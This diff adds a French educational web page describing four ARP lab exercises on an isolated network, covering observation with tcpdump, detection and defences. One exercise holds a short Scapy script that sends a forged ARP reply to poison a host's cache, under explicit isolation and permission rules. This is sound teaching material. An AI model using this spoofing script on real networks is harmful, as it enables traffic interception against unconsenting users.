@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Quatre travaux pratiques sur ARP, l'usurpation ARP, HTTP/HTTPS et les protections, à réaliser sur un réseau isolé.">
+<title>Laboratoire ARP — 4 TP | Bash World</title>
+<link rel="stylesheet" href="../../../moteur/styles.css">
+<style>
+.lab-nav{display:flex;flex-wrap:wrap;gap:.65rem;margin:1.5rem 0}.lab-nav a,.lab-print{display:inline-block;border:1px solid #1C322D;border-radius:9px;padding:.65rem .9rem;color:#1C322D;background:#F8F3EE;text-decoration:none;font:inherit;cursor:pointer}
+.lab-print{background:#EBB552;font-weight:700}.lab-code{white-space:pre-wrap;overflow-wrap:anywhere;background:#eaf0eb;border-left:4px solid #1C322D;border-radius:7px;padding:1rem;font-size:.89rem;line-height:1.55}
+.lab-tp{margin:2rem 0;padding:1.4rem 1.6rem;background:#fff;border:1px solid #d3dcd5;border-radius:15px}
+.lab-tp h2{margin-top:0}.lab-tp h3{margin-top:1.3rem}.lab-safety{border:2px solid #b07834;background:#fff4dc;padding:1rem;border-radius:12px}.lab-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:.8rem}.lab-grid div{padding:1rem;border:1px solid #bdcec2;border-radius:8px}.lab-tp details{background:#edf3ee;padding:.8rem;margin:.7rem 0;border-radius:8px}.lab-tp summary{cursor:pointer;font-weight:700}.lab-check li{margin:.4rem 0}
+@media print{body[data-print-tp] .article-nav,body[data-print-tp] .lab-intro,body[data-print-tp] .lab-nav,body[data-print-tp] .lab-print,body[data-print-tp] .lab-footer{display:none!important}body[data-print-tp] .lab-tp{display:none!important;border:0;padding:0}body[data-print-tp="tp1"] #tp1,body[data-print-tp="tp2"] #tp2,body[data-print-tp="tp3"] #tp3,body[data-print-tp="tp4"] #tp4{display:block!important}body[data-print-tp] .article-main{max-width:100%;margin:0}details>*{display:block!important}.lab-tp{break-inside:auto}.lab-code{white-space:pre-wrap}a{color:#111!important}}
+</style></head>
+<body class="article-body"><nav class="article-nav" aria-label="Navigation"><a href="../../../">✳ BASH WORLD</a><a href="../../../#explorer">← Graphe des connaissances</a><a href="../arp/">Comprendre ARP</a></nav>
+<main class="article-main">
+<div class="lab-intro"><div class="eyebrow">INFORMATIQUE / RÉSEAUX / CYBERSÉCURITÉ</div><h1>Laboratoire ARP : quatre TP progressifs</h1>
+<p class="article-intro">D'abord comprendre qui possède une adresse IPv4 ; ensuite tester ce qui se passe quand un équipement ment ; enfin observer les effets et construire des protections.</p>
+<div class="lab-safety"><strong>Règle impérative :</strong> n'utilise ces manipulations que sur tes propres équipements, dans un switch de laboratoire <strong>physiquement isolé</strong> du réseau scolaire, du réseau familial et d'Internet. Aucun test sur une machine tierce sans autorisation. Les manipulations d'usurpation sont limitées à un paquet de test.</div>
+<div class="lab-grid" aria-label="Topologie"><div><strong>Pi A — Alice</strong><br>10.77.0.10/24<br>Machine observée</div><div><strong>Pi B — Bob</strong><br>10.77.0.20/24<br>Correspondant</div><div><strong>Victus — test</strong><br>10.77.0.30/24<br>Capture et simulation</div><div><strong>Switch</strong><br>Ethernet isolé<br>Aucun lien routeur</div></div>
+<p>Vérifier le nom de l'interface avec <code>ip -br link</code>. Les commandes supposent <code>eth0</code>. Configurer sur chaque hôte une adresse statique différente sans route par défaut sur le LAN de TP.</p>
+<pre class="lab-code"># Pi A, adapter sur les autres équipements (.20 et .30)
+sudo ip addr add 10.77.0.10/24 dev eth0
+sudo ip link set eth0 up
+ip -br addr
+ip route</pre></div>
+<div class="lab-nav"><a href="#tp1">01 · Observer ARP</a><a href="#tp2">02 · ARP Spoofing</a><a href="#tp3">03 · HTTP / HTTPS</a><a href="#tp4">04 · Détecter / protéger</a></div>
+<section class="lab-tp" id="tp1"><div class="eyebrow">TP 01 · 45 MIN · OBSERVATION</div><h2>Observer ARP avec tcpdump</h2><p><strong>Problème :</strong> Alice connaît l'adresse IP de Bob, mais pas son adresse MAC. Comment peut-elle lui transmettre une trame ?</p>
+<h3>Hypothèse</h3><p>La machine interroge le lien local. Une réponse lui permet de mémoriser temporairement l'association IPv4–MAC.</p>
+<h3>Manipulation</h3><p>Sur le Victus, capturer ARP. Depuis Alice, effacer l'entrée Bob puis la solliciter.</p>
+<pre class="lab-code"># Victus : voir les requêtes broadcast
+sudo tcpdump -n -e -i eth0 arp
+
+# Alice : supprimer puis reconstruire l'entrée
+sudo ip neigh del 10.77.0.20 dev eth0 2>/dev/null || true
+ping -c 2 10.77.0.20
+ip neigh show 10.77.0.20</pre>
+<p>La réponse unicast peut ne pas être visible sur le port du Victus sans port miroir ; effectuer la capture sur Alice pour voir les deux sens.</p>
+<h3>À relever</h3><ul class="lab-check"><li>MAC de diffusion de la requête ;</li><li>IPv4 demandée et MAC annoncée dans la réponse ;</li><li>contenu du cache avant et après le ping.</li></ul>
+<details><summary>Correction raisonnée</summary><p>ARP traduit une IPv4 locale connue en adresse de liaison. La demande est broadcast parce que la MAC recherchée est inconnue. Pour une destination distante, Alice chercherait généralement la MAC de son prochain saut, et non celle du serveur distant.</p></details>
+<button class="lab-print" data-print="tp1">Imprimer / enregistrer le TP 1 en PDF</button></section>
+<section class="lab-tp" id="tp2"><div class="eyebrow">TP 02 · 45 MIN · USURPATION CONTRÔLÉE</div><h2>Pourquoi peut-on mentir avec ARP ?</h2><p><strong>Problème :</strong> ARP authentifie-t-il réellement la correspondance entre une IPv4 et une adresse MAC ?</p>
+<h3>État initial</h3><pre class="lab-code"># Alice
+ping -c 1 10.77.0.20
+ip neigh show 10.77.0.20
+# Sur Pi B et Victus : relever leur vraie MAC
+cat /sys/class/net/eth0/address</pre>
+<h3>Expérience</h3><p>Le Victus diffuse une seule annonce ARP indiquant mensongèrement que l'IPv4 de Bob correspond à la MAC du Victus. Prévoir Scapy sur le Victus.</p>
+<pre class="lab-code">sudo python3 - &lt;&lt;'PY'
+from scapy.all import ARP, Ether, sendp, get_if_hwaddr
+iface = "eth0"
+mac = get_if_hwaddr(iface)
+frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+    op=2, psrc="10.77.0.20", hwsrc=mac,
+    pdst="10.77.0.10", hwdst="ff:ff:ff:ff:ff:ff")
+sendp(frame, iface=iface, count=1, verbose=False)
+PY
+# Sur Alice
+ip neigh show 10.77.0.20</pre>
+<p>Si la MAC change, le cache a accepté l'annonce mensongère. Si elle ne change pas, comparer la capture à la politique d'apprentissage de l'OS. Ce test n'active ni relais de paquets ni interception cachée.</p>
+<h3>Nettoyer et vérifier</h3><pre class="lab-code">sudo ip neigh del 10.77.0.20 dev eth0 2>/dev/null || true
+ping -c 1 10.77.0.20
+ip neigh show 10.77.0.20</pre>
+<details><summary>Correction raisonnée</summary><p>ARP ne fournit pas de preuve cryptographique d'identité. Une fausse annonce peut empoisonner le cache selon le système et son état. Cela ne suffit pas à établir un MITM : faire transiter correctement le trafic à travers l'attaquant exige d'autres conditions.</p></details>
+<button class="lab-print" data-print="tp2">Imprimer / enregistrer le TP 2 en PDF</button></section>
+<section class="lab-tp" id="tp3"><div class="eyebrow">TP 03 · 45 MIN · CONFIDENTIALITÉ</div><h2>Observer HTTP, comprendre HTTPS</h2><p><strong>Problème :</strong> voir passer des trames revient-il à lire les échanges ?</p>
+<p>On utilise volontairement un serveur HTTP de laboratoire, sans interception furtive. Sur Pi B :</p>
+<pre class="lab-code">mkdir -p ~/arp-http
+printf 'Bonjour du laboratoire ARP\n' &gt; ~/arp-http/index.html
+cd ~/arp-http
+python3 -m http.server 8080 --bind 10.77.0.20</pre>
+<p>Capturer côté Pi B et, depuis Alice, récupérer le texte.</p>
+<pre class="lab-code"># Pi B, second terminal
+sudo tcpdump -A -s 0 -i eth0 'tcp port 8080'
+# Alice
+curl http://10.77.0.20:8080/</pre>
+<p>Repérer la requête GET et la réponse lisible. Comparer ensuite, dans un environnement TLS local configuré pour les tests ou lors d'une observation HTTPS légitime hors du LAN isolé, les métadonnées visibles et le corps HTTP chiffré.</p>
+<details><summary>Correction raisonnée</summary><p>HTTP non chiffré peut exposer requêtes et réponses. HTTPS (TLS correctement validé) protège le contenu applicatif contre un observateur réseau. ARP Spoofing n'annule pas à lui seul les protections TLS ; ne jamais ignorer une alerte de certificat.</p></details>
+<button class="lab-print" data-print="tp3">Imprimer / enregistrer le TP 3 en PDF</button></section>
+<section class="lab-tp" id="tp4"><div class="eyebrow">TP 04 · 45 MIN · DÉFENSE</div><h2>Détecter et limiter une usurpation ARP</h2><p><strong>Problème :</strong> comment repérer et limiter le remplacement injustifié d'une association IPv4–MAC ?</p>
+<h3>Observer les changements</h3><pre class="lab-code">ip neigh show 10.77.0.20 dev eth0 | tee /tmp/arp-reference.txt
+watch -n 1 'ip neigh show 10.77.0.20 dev eth0'
+# Autre terminal
+sudo tcpdump -n -e -i eth0 arp</pre>
+<p>Comparer l'état avant et après le TP 2. Un changement de MAC n'est pas à lui seul une preuve d'attaque : il peut exister des changements matériels ou des systèmes de haute disponibilité.</p>
+<h3>Tester une entrée statique</h3><p>Sur Alice, substituer à l'exemple ci-dessous la vraie MAC de Pi B.</p>
+<pre class="lab-code">sudo ip neigh replace 10.77.0.20 lladdr XX:XX:XX:XX:XX:XX \
+  nud permanent dev eth0
+ip neigh show 10.77.0.20 dev eth0</pre>
+<p>Répéter le paquet du TP 2 et examiner le cache. L'entrée statique est pertinente pour un petit test, mais coûteuse à maintenir et susceptible de provoquer une panne si la MAC est incorrecte.</p>
+<h3>Comparer les protections</h3><p>Dynamic ARP Inspection (DAI) sur un switch compatible valide les annonces ARP sur les ports non fiables, généralement avec des liaisons IP–MAC issues du DHCP Snooping. Les VLAN limitent le périmètre mais ne protègent pas deux hôtes du même VLAN. TLS protège les données applicatives.</p>
+<h3>Rétablir l'état normal</h3><pre class="lab-code">sudo ip neigh del 10.77.0.20 dev eth0
+ping -c 1 10.77.0.20
+ip neigh show 10.77.0.20</pre>
+<details><summary>Correction raisonnée</summary><p>Surveillance = détecter ; entrée permanente = figer une association sur un hôte ; DAI = filtrer des réponses ARP au niveau du switch ; TLS = préserver la confidentialité et l'authenticité applicative. Aucune de ces mesures ne remplace entièrement les autres.</p></details>
+<button class="lab-print" data-print="tp4">Imprimer / enregistrer le TP 4 en PDF</button></section>
+<section class="lab-footer note"><strong>À retenir :</strong> ARP répond au besoin de livrer une trame sur un lien IPv4 local. Sa faiblesse vient de l'absence d'authentification native des annonces. Usurpation, détournement et interception ne sont pas synonymes. Le laboratoire sépare l'observation du protocole, l'injection de test, la protection des données et les défenses.</section>
+<section class="lab-footer"><h2>Sources et approfondissements</h2><p><a href="https://www.rfc-editor.org/rfc/rfc826">RFC 826 — An Ethernet Address Resolution Protocol (1982)</a> · <a href="https://www.rfc-editor.org/rfc/rfc5227">RFC 5227 — IPv4 Address Conflict Detection (2008)</a> · <a href="https://man7.org/linux/man-pages/man8/ip-neighbour.8.html">ip-neighbour(8)</a> · <a href="https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst9400/software/release/17-18/configuration_guide/sec/b_1718_sec_9400_cg/configuring_dynamic_arp_inspection.html">Cisco — Dynamic ARP Inspection</a>.</p><a class="button gold" href="../../../#explorer">Retour au graphe</a></section>
+</main>
+<script>document.querySelectorAll('[data-print]').forEach(button => button.addEventListener('click', () => { document.body.dataset.printTp = button.dataset.print; window.print(); }));window.addEventListener('afterprint',()=>{delete document.body.dataset.printTp});</script>
+</body></html>
